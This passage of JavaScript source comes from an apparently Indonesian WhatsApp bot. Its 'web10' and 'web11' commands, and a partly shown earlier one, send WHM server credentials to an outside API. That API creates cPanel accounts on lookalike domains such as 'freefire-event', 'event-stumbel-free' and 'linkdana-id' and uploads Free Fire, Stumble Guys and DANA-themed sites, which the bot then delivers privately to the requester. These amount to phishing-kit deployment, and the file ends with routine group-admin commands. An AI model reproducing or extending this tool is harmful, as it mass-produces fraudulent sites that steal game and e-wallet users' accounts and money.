            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "freefire-event" + makeid(7) + "." + "event-freefire-free.tk"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.rakaganz.xyz/arga/epep/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "freefire",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.rakaganz.xyz/arga/epep/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Free Fire Spin\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'web10' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "event-stumbel-free" + makeid(7) + "." + "polaris.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.rakaganz.xyz/arga/stumbel/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "stumbel",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.rakaganz.xyz/arga/stumbel/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Stumbel Guys\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'web11' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "linkdana-id" + makeid(7) + "." + "polaris.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.rakaganz.xyz/arga//createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "daget",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.rakaganz.xyz/arga//upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Dana Kaget\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break
   
            // 2 OKTOBER 2022








case 'grup':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (args.length < 1) return reply("silahkan pilih grup open/close")
if (args[0] === 'open'){ await deni.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'close'){ await deni.groupSettingUpdate(from, 'announcement')} else { reply('yang bener lah pantek')}
break

case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await deni.groupParticipantsUpdate(from, [remove], "remove")
break

case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await deni.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await deni.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

case 'leave':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await deni.groupLeave(from)
break

case 'delete': case 'd': case 'del':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
deni.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 restart den`, (error, stdout, stderr) => {
    reply("BERHASIL RESTART ULANG")
    reply(stdout)
})
break

case 'shutdown':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break
default:
}} catch (e) {
console.log(e)
}
}